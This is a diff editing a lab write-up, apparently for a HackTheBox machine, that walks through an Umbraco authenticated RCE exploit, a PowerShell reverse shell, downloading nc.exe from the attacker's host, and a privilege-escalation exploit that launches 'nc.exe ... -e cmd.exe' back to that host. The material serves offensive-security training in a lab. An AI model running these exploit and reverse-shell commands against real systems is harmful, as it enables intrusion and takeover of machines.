@@ -39,17 +39,14 @@ created: 2025-08-28
 
 - Copy the remote `NFS` drive locally with `cp -r ...` if possible for easier navigation and to preserve integrity.
 - If the database is corrupted, we may still be able to extract data with `strings` + `grep`. If it's a lot of output, pipe it to `less`.
-- Port 21 (`FTP`) and `445` were of no use. Even easy machines can have ports that are just rabbit holes (technically, `SMB` was there for the intended privesc with `psexec`).
 - I didn't take the intended privilege escalation path, which was abusing a vulnerable version of `TeamViewer` to extract the local admin's password, then logging in as admin with `psexec.py` and this password.
-- Try passwords even for the administrator user.
-- Look for non-standard installed software. Look for vulnerabilities in that software.
+- Enumerate non-standard installed software.
 
 ----
 
 ## 🌐 Port Scan
 
 - **TCP**: 21, 80, 111, 135, 139, 445, 2049, 5985, ...
-- **UDP**: None
 
 ---
 
@@ -155,7 +152,7 @@ Umbraco v8.14.1 - 'baseUrl' SSRF                                                
 Shellcodes: No Results
 ```
 
-There are authenticated `RCE` exploits for the exact version the target runs. The first one wasn't straightforward, so I used the second (49488).
+There are authenticated `RCE` exploits for the exact version the target runs. The first one wasn't straightforward, so I used the second one (49488).
 
 ```shell
 python 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami
@@ -167,7 +164,7 @@ Got `RCE`.
 Let's get a reverse shell with the `PowerShell` `base64` payload.
 
 ```shell
-listen windows 1234
+nc -lvnp 1234
 ```
 
 ```shell
@@ -175,15 +172,9 @@ python 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c '
 ```
 
 >[!note]
->The script's source shows that `-a <arg>` passes arguments to the command.
+>The script's source code shows that `-a <arg>` passes arguments to the command.
 
 ```shell
-listen windows 1234
-Ncat: Version 7.95 ( https://nmap.org/ncat )
-Ncat: Listening on [::]:1234
-Ncat: Listening on 0.0.0.0:1234
-Ncat: Connection from 10.10.10.180:50325.
-
 PS C:\windows\system32\inetsrv> whoami
 iis apppool\defaultapppool
 ```
@@ -231,7 +222,7 @@ OS Manufacturer:           Microsoft Corporation
 <SNIP>
 ```
 
-And enumerated the privileges of my current user:
+I enumerated the privileges of my current user:
 
 ```shell
 PS C:\> whoami /priv
@@ -267,7 +258,7 @@ PS C:\Temp> wget http://10.10.14.11:8000/nc.exe -outfile nc.exe
 Start another listener:
 
 ```shell
-listen windows 8443
+nc -lvnp 8443
 ```
 
 And run the exploit:
@@ -277,7 +268,7 @@ PS C:\Temp> .\ps.exe -c "C:\Temp\nc.exe 10.10.14.11 8443 -e cmd.exe"
 ```
 
 ```shell
-listen windows 8443
+nc -lvnp 8443
 Ncat: Version 7.95 ( https://nmap.org/ncat )
 Ncat: Listening on [::]:8443
 Ncat: Listening on 0.0.0.0:8443
